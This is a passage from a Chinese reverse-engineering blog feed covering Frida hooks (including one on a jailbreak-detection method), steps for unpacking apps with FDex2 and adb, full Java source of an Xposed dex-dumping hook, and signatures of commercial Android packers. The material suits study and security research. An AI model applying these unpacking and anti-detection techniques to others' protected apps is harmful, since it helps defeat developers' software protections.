class="comment">//hook返回值，</span></span><br><span class="line">Interceptor.attach(Module.getExportByName(<span class="string">&#x27;libc.so&#x27;</span>, <span class="string">&#x27;read&#x27;</span>), &#123;</span><br><span class="line">  <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.fileDescriptor = args[<span class="number">0</span>].toInt32();</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (retval.toInt32() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">/* do something with this.fileDescriptor */</span></span><br><span class="line">    &#125;&#125;&#125;);</span><br></pre></td></tr></table></figure><p>定义js脚本后，尝试hook出“OBJC: +[BLYDevice isJailBreak]”的传入值和返回值，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_specific_method_of_class</span>(<span class="params">className, funcName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> hook = ObjC.classes[className][funcName];</span><br><span class="line">    Interceptor.attach(hook.implementation, &#123;</span><br><span class="line">      <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// args[0] is self</span></span><br><span class="line">        <span class="comment">// args[1] is selector (SEL &quot;sendMessageWithText:&quot;)</span></span><br><span class="line">        <span class="comment">// args[2] holds the first function argument, an NSString</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;\n\t[*] Class Name: &quot;</span> + className);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;[*] Method Name: &quot;</span> + funcName);</span><br><span class="line">        <span class="comment">//For viewing and manipulating arguments</span></span><br><span class="line">        <span class="comment">//console.log(&quot;\t[-] Value1: &quot;+ObjC.Object(args[2]));</span></span><br><span class="line">        <span class="comment">//console.log(&quot;\t[-] Value2: &quot;+(ObjC.Object(args[2])).toString());</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;\t[-]arg value   &quot;</span>+args[<span class="number">2</span>]);</span><br><span class="line">        Interceptor.attach(hook.implementation, </span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;[*] Class Name: &quot;</span> + className);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;[*] Method Name: &quot;</span> + funcName);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;\t[-] Return Value: &quot;</span> + retval);</span><br><span class="line">             &#125;&#125;</span><br><span class="line">            );</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-CLI"><a href="#Frida-CLI" class="headerlink" title="Frida CLI"></a>Frida CLI</h3><p>使用 Frida CLI 工具（Frida）以交互方式处理 Frida。它钩住一个进程，并为您提供一个到 Frida<br>的 API 的命令行接口。<br>$ frida -U com.android.chrome<br>使用-l 选项，还可以使用 fridacli 加载脚本，例如 myscript.js 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ frida -U -l myscript.js com.android.chrome</span><br></pre></td></tr></table></figure><hr><p>参考:<br>Frida github:<a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a><br>Frida教程:<br><a href="https://eternalsakura13.com/2020/07/04/frida/">https://eternalsakura13.com/2020/07/04/frida/</a><br><a href="https://zhuanlan.zhihu.com/p/35411248">https://zhuanlan.zhihu.com/p/35411248</a></p><p><a href="https://blog.csdn.net/weixin_35016347/article/details/104002411?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-1&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/weixin_35016347/article/details/104002411?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-1&amp;spm=1001.2101.3001.4242</a><br><a href="https://blog.csdn.net/zhy025907/article/details/89512096">https://blog.csdn.net/zhy025907/article/details/89512096</a></p><p><a href="https://www.52pojie.cn/thread-1128884-1-1.html">https://www.52pojie.cn/thread-1128884-1-1.html</a></p><p><a href="https://blog.csdn.net/freeking101/article/details/106965168?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control">https://blog.csdn.net/freeking101/article/details/106965168?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.control</a></p><p><a href="https://blog.csdn.net/qingemengyue/article/details/80061491?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/qingemengyue/article/details/80061491?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&amp;spm=1001.2101.3001.4242</a></p><p><a href="https://www.jianshu.com/p/ca8381d3e094">https://www.jianshu.com/p/ca8381d3e094</a></p><p>Frida HOOK加解密函数:<br><a href="https://www.freebuf.com/articles/mobile/252882.html">https://www.freebuf.com/articles/mobile/252882.html</a></p><p>非root设备:<br><a href="https://koz.io/using-frida-on-android-without-root/">https://koz.io/using-frida-on-android-without-root/</a></p><p>hook实例:<br><a href="https://bbs.pediy.com/thread-227232.htm">https://bbs.pediy.com/thread-227232.htm</a><br><a href="https://bbs.pediy.com/thread-258776.htm">https://bbs.pediy.com/thread-258776.htm</a></p><p>移动安全-Frida脱壳脚本与加固迭代<br><a href="https://bwshen.blog.csdn.net/article/details/114269713?utm_medium=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~default-6.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~default-6.control">https://bwshen.blog.csdn.net/article/details/114269713?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7Edefault-6.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7Edefault-6.control</a></p><p>r0ysue大佬进阶篇:<br><a href="https://github.com/r0ysue/AndroidSecurityStudy">https://github.com/r0ysue/AndroidSecurityStudy</a></p><p><a href="https://tool.pediy.com/index-detail-188.htm">https://tool.pediy.com/index-detail-188.htm</a></p><p><a href="https://www.kanxue.com/chm.htm?id=14691&amp;pid=node1001314">https://www.kanxue.com/chm.htm?id=14691&amp;pid=node1001314</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>App脱壳实例</title>
      <link href="/2021/03/23/packers-shelling/"/>
      <url>/2021/03/23/packers-shelling/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="android-app脱壳方法研究"><a href="#android-app脱壳方法研究" class="headerlink" title="android app脱壳方法研究"></a>android app脱壳方法研究</h2><p><a href="https://cloud.tencent.com/developer/article/1740663">https://cloud.tencent.com/developer/article/1740663</a><br><img src="1.png"><br>修改系统源码自动脱壳<br>通过hook对关键函数进行脱壳<br>开源工具zjdroid,dexhunter进行脱壳<br>利用IDA或者GDB动态调试进行脱壳</p><hr><h2 id="FDex2脱壳实例"><a href="#FDex2脱壳实例" class="headerlink" title="FDex2脱壳实例"></a>FDex2脱壳实例</h2><p>① 在Xposed中激活FDex2<br>② 启动Xposed中的FDex2，并配置要脱壳的应用。<br>③ 在VirtualXposed中运行要脱壳的应用。<br>④ 导出脱壳的dex文件：<br>脱壳后的dex文件在/data/user/0/{packageName}该目录下查看，多出来的dex文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root设备：</span><br><span class="line">adb root</span><br><span class="line">adb pull /data/user/0/iv.va.exposed/virtual/data/user/0/&#123;packageName&#125;   &#123;电脑上的目录&#125;</span><br></pre></td></tr></table></figure><p>⑤ 通过dex2jar对 脱壳的dex进行反编译</p><h2 id="FDex2核心代码MainHook"><a href="#FDex2核心代码MainHook" class="headerlink" title="FDex2核心代码MainHook"></a>FDex2核心代码MainHook</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ppma.xposed;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XSharedPreferences;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainHook</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    XSharedPreferences xsp;</span><br><span class="line">    Class Dex;</span><br><span class="line">    Method Dex_getBytes;</span><br><span class="line">    Method getDex;</span><br><span class="line">    String packagename;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        xsp = <span class="keyword">new</span> XSharedPreferences(<span class="string">&quot;com.ppma.appinfo&quot;</span>, <span class="string">&quot;User&quot;</span>);</span><br><span class="line">        xsp.makeWorldReadable();</span><br><span class="line">        xsp.reload();</span><br><span class="line">        initRefect();</span><br><span class="line">        packagename = xsp.getString(<span class="string">&quot;packagename&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;设定包名：&quot;</span>+packagename);</span><br><span class="line">        <span class="keyword">if</span> ((!lpparam.packageName.equals(packagename))||packagename==<span class="keyword">null</span>) &#123;</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;当前程序包名与设定不一致或者包名为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;目标包名：&quot;</span>+lpparam.packageName);</span><br><span class="line">        String str = <span class="string">&quot;java.lang.ClassLoader&quot;</span>;</span><br><span class="line">        String str2 = <span class="string">&quot;loadClass&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        XposedHelpers.findAndHookMethod(str, lpparam.classLoader, str2, String.class, Boolean.TYPE, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.afterHookedMethod(param);</span><br><span class="line">                Class cls = (Class) param.getResult();</span><br><span class="line">                <span class="keyword">if</span> (cls == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">//XposedBridge.log(&quot;cls == null&quot;);</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String name = cls.getName();</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;当前类名：&quot;</span> + name);</span><br><span class="line">                <span class="keyword">byte</span>[] bArr = (<span class="keyword">byte</span>[]) Dex_getBytes.invoke(getDex.invoke(cls, <span class="keyword">new</span> Object[<span class="number">0</span>]), <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">if</span> (bArr == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;数据为空：返回&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;开始写数据&quot;</span>);</span><br><span class="line">                String dex_path = <span class="string">&quot;/data/data/&quot;</span> + packagename + <span class="string">&quot;/&quot;</span> + packagename + <span class="string">&quot;_&quot;</span> + bArr.length + <span class="string">&quot;.dex&quot;</span>;</span><br><span class="line">                XposedBridge.log(dex_path);</span><br><span class="line">                File file = <span class="keyword">new</span> File(dex_path);</span><br><span class="line">                <span class="keyword">if</span> (file.exists()) <span class="keyword">return</span>;</span><br><span class="line">                writeByte(bArr, file.getAbsolutePath());</span><br><span class="line">            &#125;</span><br><span class="line">            &#125; );</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initRefect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Dex = Class.forName(<span class="string">&quot;com.android.dex.Dex&quot;</span>);</span><br><span class="line">            Dex_getBytes = Dex.getDeclaredMethod(<span class="string">&quot;getBytes&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">            getDex = Class.forName(<span class="string">&quot;java.lang.Class&quot;</span>).getDeclaredMethod(<span class="string">&quot;getDex&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">writeByte</span><span class="params">(<span class="keyword">byte</span>[] bArr, String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            OutputStream outputStream = <span class="keyword">new</span> FileOutputStream(str);</span><br><span class="line">            outputStream.write(bArr);</span><br><span class="line">            outputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;文件写出失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Youpk-基于ART的主动调用的脱壳机"><a href="#Youpk-基于ART的主动调用的脱壳机" class="headerlink" title="Youpk:基于ART的主动调用的脱壳机"></a>Youpk:基于ART的主动调用的脱壳机</h2><p><a href="https://bbs.pediy.com/thread-259854.htm">https://bbs.pediy.com/thread-259854.htm</a><br>脱壳实例:<br><a href="https://www.jianshu.com/p/07cbe154879b">https://www.jianshu.com/p/07cbe154879b</a></p><p><a href="https://www.freebuf.com/articles/network/166020.html">https://www.freebuf.com/articles/network/166020.html</a></p><hr><p>实用FRIDA进阶：脱壳、自动化、高频问题<br> <a href="https://www.anquanke.com/post/id/197670">https://www.anquanke.com/post/id/197670</a><br> <a href="https://github.com/r0ysue/AndroidSecurityStudy">https://github.com/r0ysue/AndroidSecurityStudy</a></p><hr><p>梆梆加固函数抽取执行流程：<br>函数的第一条指令是goto，然后中间是一系列的nop(预留空间)，第一条指令goto到末尾，跳过预留空间，跳转到的位置是一条invoke指令，调用壳中的还原函数，还原函数会将前面预留空间(一系列nop)还原成函数原指令，然后执行流程再跳转到第一条goto指令的后面，继续执行已经还原好的函数原指令。</p><hr><h3 id="dalvik-寄存器"><a href="#dalvik-寄存器" class="headerlink" title="dalvik 寄存器"></a>dalvik 寄存器</h3><p>32位<br>64 使用两个寄存器</p><p>寄存器P 参数寄存器<br>V 局部变量寄存器</p><p>.java-&gt;.class-&gt;.dex-&gt;smali<br>dx-dex –output=</p><h3 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h3><p>包名/类名; -&gt;字段:类型</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>(III)Z:方法签名信息</p><h3 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h3><pre><code>基础字节码 - 名称后缀/字节码后缀 目的寄存器 源寄存器</code></pre><p>move ,基础字节码,opcode<br>名称后缀wide,数据宽度64位<br>from16,源寄存器16位<br>V0<del>V255目的寄存器<br>v0</del>65535源寄存器</p><h3 id="dalvik指令"><a href="#dalvik指令" class="headerlink" title="dalvik指令"></a>dalvik指令</h3><ul><li>nop : 空操作指令,值00,一般对齐代码使用;</li><li>move : 赋值操作,move-result接收方法返回值,异常处理;</li><li>return : 返回值<br>return-void : 返回值为空</li><li>object : 对象类型</li></ul><hr><hr><p>so文件加载时的过程<br>.init-&gt;.init_array-&gt;JNI_Onload-&gt;java_com_xxx<br>.init,init_array一般作为壳的入口(外壳级so文件)</p><hr><p>最近看了一个关于流氓app是获取语音信息的视频<br>原来加速传感器还能这么玩的<br>瞬间瞬间想试一下这个能偷听你说话的传感器到底有多强</p><p>这么一看还顺便了解了一下手机的其他传感器<br><a href="https://blog.csdn.net/weixin_43896750/article/details/95942772?utm_medium=distribute.pc_relevant.none-task-blog-title-7&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/weixin_43896750/article/details/95942772?utm_medium=distribute.pc_relevant.none-task-blog-title-7&amp;spm=1001.2101.3001.4242</a><br>手机自带的硬件确实好用(旧手机也是一个好东西,上面的硬件不应该放着吃灰)<br>关键是直接调用大佬们写好的方法就行,适当改进一下用法就行</p><hr><p>几个关于加速传感器的介绍:<br><a href="https://zhuanlan.zhihu.com/p/35856475">https://zhuanlan.zhihu.com/p/35856475</a><br><a href="https://blog.csdn.net/Li_peilun/article/details/68921262">https://blog.csdn.net/Li_peilun/article/details/68921262</a><br><a href="https://blog.csdn.net/weixin_43896750/article/details/95942772?utm_medium=distribute.pc_relevant.none-task-blog-title-7&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/weixin_43896750/article/details/95942772?utm_medium=distribute.pc_relevant.none-task-blog-title-7&amp;spm=1001.2101.3001.4242</a><br><a href="https://blog.csdn.net/youmingyu/article/details/52750374">https://blog.csdn.net/youmingyu/article/details/52750374</a></p><p><a href="https://www.dazhuanlan.com/2020/03/24/5e7928c2417ae/">https://www.dazhuanlan.com/2020/03/24/5e7928c2417ae/</a></p>]]></content>
      
      
      <categories>
          
          <category> 脱壳 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向及工具使用</title>
      <link href="/2021/02/19/Android-Reverse/"/>
      <url>/2021/02/19/Android-Reverse/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script defer src="https://cdn.jsdelivr.net/combine/npm/jquery@latest/dist/jquery.min.js,gh/weilining/jsdelivr/jquery/circlemagic/circlemagic.min.js,gh/weilining/jsdelivr@latest/jquery/circlemagic/butterflycirclemagic.js"></script><h1 id="App加壳和脱壳"><a href="#App加壳和脱壳" class="headerlink" title="App加壳和脱壳"></a>App加壳和脱壳</h1><h2 id="常见的壳"><a href="#常见的壳" class="headerlink" title="常见的壳"></a>常见的壳</h2><p>通常是看lib文件夹下so库特征，以下是市面上常见的不同厂商对APP的加固特征：<br>爱加密：libexec.so,libexecmain.so，ijiami.dat<br>梆梆： libsecexe.so,libsecmain.so , libDexHelper.so libSecShell.so<br>360：libprotectClass.so,libjiagu.so，libjiagu_art.so，libjiagu_x86.so<br>百度：libbaiduprotect.so<br>腾讯：libshellx-2.10.6.0.so，libBugly.so，libtup.so, libexec.so，libshell.so，stub_tengxun<br>网易易盾：libnesec.so<br>娜迦： libchaosvmp.so , libddog.solibfdog.so<br>通付盾：libegis.so<br>网秦：libnqshield.so</p><h3 id="脱壳机制原理"><a href="#脱壳机制原理" class="headerlink" title="脱壳机制原理"></a>脱壳机制原理</h3><p>smali层：只做了一些简单的混淆<br>Native 层：<br>和如下内容相关<br>各种so库<br>比如libdvm.so<br>对应着内部函数调用：<br>.init<br>.init_array<br>JNI_Onload<br>分析修改ELF头信息<br>sub_xxx函数<br>比如：sub_78614CD0<br>R2寄存器<br>最后分析出：<br>ClassLoader<br>loadDex<br>multidex<br>（作者）QEver<br>写的一个IDA的脚本=一个dex脱壳脚本<br>配合kill方法，可以实现脱绝大部分运行于dalvik上的dex壳<br>可以dump导出正确的dex文件<br>脱壳注意事项和说明<br>不是所有的加固的安卓apk都能成功脱壳的。<br>比如，康美通的安卓apk：<br>老版本 v2.0.7 没有加固，可以直接用Jadx反编译得到源码的<br>新版本 v4.4.0 是360加固保加固的，用FDex2也无法导出dex，无法破解<br>总结出来就是：<br>没有加固的：直接用Jadx即可导出源码<br>比如老旧的Android的apk，很多都没有加固<br>不管你怎么混淆都很容易被人分析得干干净净<br>部分加密不强的：可以脱壳<br>包括<br>老一代或免费的360加固保<br>爱加密（收费）<br>娜迦加固（收费）<br>用FDex2可以脱壳<br>可以hook导出dex，再dex转jar，jar转java源码<br>腾讯乐固，新一代的360加固保：没法脱壳<br>即使用FDex2也无法脱壳无法破解，无法得到dex文件<br>其中新一代的360加固保：用art模式+dex2oat相关机制，或许可以破解<br>【未解决】用ART，oat，dex2oat相关机制去破解新一代360、腾讯等安卓apk的加固<br>对于使用加固方案的建议和结论<br>免费版的加固可以防止大多数只会反编译的小白<br>对于普通攻击者还是很有效果的<br>对于会用工具脱壳的，还是没太大用途的<br>除非用更加高级的，收费版的加固服务<br>估计就很难破解，很难脱壳了<br>如果真的想要彻底防止别人破解<br>除了考虑（用更高级的）加固方式<br>还要花精力在app的业务逻辑层面，权限校验等方面，防止被破解<br>如何判断是哪家加固方案<br>通过反编译工具后，从dex或jar包的目录结构，以及相关的文件（比如AndroidManifest.xml）的内容，往往可以看出是哪家的加密方案：<br>腾讯乐固加密后的目录结构和典型内容<br>腾讯的乐固legu加密加壳后的apk，去用apktool反编译后，得到的jar包的目录结构是：<br>com.tencent.bugly<br>com.tencent.bugly.legu<br>crashreport<br>proguard<br>com.tencent.StubShell<br>TxAppEntry<br>截图举例：</p><p>详细的目录结构和文件是：<br>➜  tencent ll<br>total 0<br>drwxr-xr-x  12 crifan  staff   384B  3 14 13:39 StubShell<br>drwxr-xr-x   3 crifan  staff    96B  3 14 13:39 bugly<br>➜  tencent tree .<br>.<br>├── StubShell<br>│   ├── SystemClassLoaderInjector.smali<br>│   ├── SystemInfoException.smali<br>│   ├── TxAppEntry.smali<br>│   ├── TxReceiver.smali<br>│   ├── XposedCheck.smali<br>│   ├── ZipUtil.smali<br>│   ├── a.smali<br>│   ├── b.smali<br>│   ├── c.smali<br>│   └── d.smali<br>└── bugly<br>    └── legu<br>        ├── Bugly.smali<br>        ├── BuglyStrategy$a.smali<br>        ├── BuglyStrategy.smali<br>        ├── CrashModule.smali<br>        ├── a.smali<br>        ├── b.smali<br>        ├── crashreport<br>        │   ├── BuglyHintException.smali<br>        │   ├── BuglyLog.smali<br>        │   ├── CrashReport$CrashHandleCallback.smali<br>        │   ├── CrashReport$UserStrategy.smali<br>        │   ├── CrashReport.smali<br>        │   。。。<br>        │   └── inner<br>        │       └── InnerAPI.smali<br>        └── proguard<br>            ├── a.smali<br>            ├── 。。。<br>            └── z.smali<br>➜  lib tree .<br>.<br>├── arm64-v8a<br>│   ├── libBugly.so<br>│   ├── libgifimage.so<br>│   ├── libimagepipeline.so<br>│   ├── libjcore119.so<br>│   ├── libshella-2.9.1.2.so<br>│   └── libstatic-webp.so<br>├── armeabi<br>│   ├── libBugly.so<br>│   ├── libgifimage.so<br>│   ├── libimagepipeline.so<br>│   ├── libjcore119.so<br>│   ├── libshella-2.9.1.2.so<br>│   ├── libstatic-webp.so<br>│   ├── mix.dex<br>│   └── mixz.dex<br>├── armeabi-v7a<br>│   ├── libBugly.so<br>│   ├── libgifimage.so<br>│   ├── libimagepipeline.so<br>│   ├── libjcore119.so<br>│   ├── libshella-2.9.1.2.so<br>│   └── libstatic-webp.so<br>├──<br>另外反编译出的AndroidManifest.xml内容：<br><application android:allowBackup="true" android:icon="@drawable/app_logo" android:label="@string/app_name" android:name="com.tencent.StubShell.TxAppEntry" android:supportsRtl="true" android:theme="@style/AppTheme"><br><meta-data android:name="TxAppEntry" android:value="com.huili.readingclub.MyApplication"/><br>android:name=”com.tencent.StubShell.TxAppEntry”<br>其中有：<br>com.tencent.StubShell.TxAppEntry<br><meta-data android:name="TxAppEntry"><br>也是典型的腾讯乐固的内容。</p><p>360加固保的加固的目录结构<br>360加固后的apk经过dex2jar反编译后的目录结构是：<br>com.qihoo.util<br>com.qihoo360.replugin<br>com.stub<br>这种结构就说明是360加固保加固的。</p><hr><h1 id="HOOK"><a href="#HOOK" class="headerlink" title="HOOK"></a>HOOK</h1><p>hook startActivity概念:<br>一个活动界面启动另一个活动界面,需要打印相关的日志内容.</p><h2 id="hook-startActivity-的用法"><a href="#hook-startActivity-的用法" class="headerlink" title="hook startActivity 的用法"></a>hook startActivity 的用法</h2><p>(1) 定义两个活动界面,完成跳转<br>(2) 找到最终代理的地方来代理start activity<br>(3) 声明一个tag,以及代理类<br>(4) 定义ActivityThread里面的原始的Instrunmentation对象<br>(5) 定义原始方法里的真正启动的activity的方法<br>(6) 打印一些activity启动前后的日志信息,也可以修改相应参数信息<br>(7) 调用方法是否在底层,是否需要反射调用,以及设置可见.<br>(8) 进行代理在Application程序的入口点来写代码<br>(9) 在Application程序的入口点来写代码<br>(10) 获取当前的ActivityThread对象,然后进行调用<br>(11) 拿到在ActivityThread类里面的原始mInstrumentation对象<br>(12) 构建我们的代理对象<br>(13) 通过反射,换掉字段<br>(14) 做个标记,方便以后查看<br>(15) 运行完毕查看日志是否HOOk成功</p><h2 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h2><h3 id="Xposed的优缺点"><a href="#Xposed的优缺点" class="headerlink" title="Xposed的优缺点"></a>Xposed的优缺点</h3><p>优点：在编写Java层hook插件的时候非常好用，这一点完全优越于Frida和SubstrateCydia，因为他也是Android项目，可以直接编写Java代码调用各类api进行操作。而且可以安装到手机上直接使用。</p><p>缺点：配置安装环境繁琐，兼容性差，在Hook底层的时候就很无助了。</p><h3 id="插件开发步骤"><a href="#插件开发步骤" 